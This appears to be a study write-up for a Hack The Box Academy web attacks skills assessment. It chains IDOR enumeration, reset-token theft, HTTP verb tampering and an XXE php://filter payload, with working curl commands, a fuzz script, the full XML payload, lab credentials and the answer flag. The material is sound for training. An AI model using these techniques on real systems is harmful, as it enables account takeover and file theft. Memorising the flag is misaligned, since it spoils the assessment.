## ID
535

## Module
Web Attacks

## Kind
lab

## Title
Skills Assessment — Web Attacks

## Description
Multi-stage assessment chaining IDOR user enumeration, HTTP verb tampering for password reset bypass, and XXE injection with PHP filter to read the flag — combining all three vulnerability classes from the module.

## Tags
idor, verb-tampering, xxe, php-filter, skills-assessment, chained-attack

## Commands
- `curl -s "http://<TARGET>:<PORT>/api.php/user/<UID>"`
- `bash fuzz.sh | grep -i "admin" | jq .`
- `curl -s "http://<TARGET>:<PORT>/api.php/token/<UID>"`
- `openssl rand -hex 16`
- `http://<TARGET>:<PORT>/reset.php?uid=52&token=<TOKEN>&password=<PASSWORD>`
- `echo '<BASE64>' | base64 -d`

## What This Section Covers
This skills assessment requires chaining three distinct web attack techniques in sequence: IDOR to enumerate users and steal a reset token, HTTP verb tampering to bypass session-based access control on the password reset endpoint, and XXE injection to read a protected file. It tests the ability to recognize each vulnerability in context and combine them into a full attack chain.

## Methodology
1. Login with `htb-student:Academy_student!` and observe the API call to `/api.php/user/74` in DevTools Network tab.
2. Fuzz UIDs 1–100 via `/api.php/user/<UID>` and grep for "admin" — find uid 52 (`a.corrales`, Administrator).
3. Exploit IDOR on the token endpoint: request `/api.php/token/52` to steal the admin's password reset token.
4. Generate a strong password with `openssl rand -hex 16`.
5. The POST to `reset.php` is blocked by session validation — bypass with HTTP verb tampering by sending a GET request with uid, token, and password as URL parameters.
6. Login as `a.corrales` with the new password.
7. Use the "Add Event" feature (admin-only) — the form sends XML data with `<name>` reflected in the response.
8. Inject XXE payload with `php://filter/convert.base64-encode/resource=/flag.php` in the `<name>` entity.
9. Decode the base64 response to get the flag.

## Multi-step Workflow (optional)
```
# Phase 1 — IDOR: Find admin user
# Create fuzz script
cat > fuzz.sh << 'EOF'
#!/bin/bash
for uid in {1..100}; do
    curl -s "http://TARGET_IP:PORT/api.php/user/$uid"; echo
done
EOF

bash fuzz.sh | grep -i "admin" | jq .
# Result: uid 52, a.corrales, Administrator

# Phase 2 — Steal token + verb tampering
# Get admin's reset token (IDOR)
curl -s "http://TARGET_IP:PORT/api.php/token/52"

# Generate password
openssl rand -hex 16

# Verb tamper: GET instead of POST to bypass session check
# Paste in browser:
http://TARGET_IP:PORT/reset.php?uid=52&token=STOLEN_TOKEN&password=GENERATED_PASSWORD

# Login as a.corrales with new password

# Phase 3 — XXE to read flag
# Intercept Add Event POST in Burp, replace body with:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
<root>
  <name>&xxe;</name>
  <details>test</details>
  <date>2021-09-22</date>
</root>

# Decode response
echo 'BASE64_STRING' | base64 -d
```

## Lab — Questions & Answers (optional)
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Read /flag.php | HTB{m4573r_w3b_4774ck3r} | IDOR → find admin uid 52 → steal token → verb tamper GET reset → login → XXE php://filter on Add Event |

## Key Takeaways
- Chained attacks are realistic — each vulnerability alone might seem low-impact, but together they achieve full compromise.
- IDOR isn't just about accessing data — here it's used twice: once to enumerate users and once to steal the reset token.
- HTTP verb tampering bypasses access controls that only validate on one HTTP method — always test GET vs POST vs PUT when blocked.
- The admin-only feature (Add Event) introduces a new attack surface (XML input) that wasn't visible to the low-priv user — privilege escalation reveals new vectors.
- The attack chain pattern (enumerate → escalate → exploit) mirrors real-world assessments where you stack small findings into critical impact.

## Gotchas (optional)
- The POST to reset.php returns "Access Denied" because it checks PHPSESSID against uid — this is by design, not a bug in your payload. Switch to GET.
- The token is tied to the uid, so you must request `/api.php/token/52` specifically — using your own token (uid 74) won't work for uid 52.
- The Add Event feature only appears after logging in as an admin user — if you don't see it, you haven't completed the privilege escalation step.
- The XXE entity goes in `<name>`, not `<details>` or `<date>` — only `<name>` is reflected in the response.
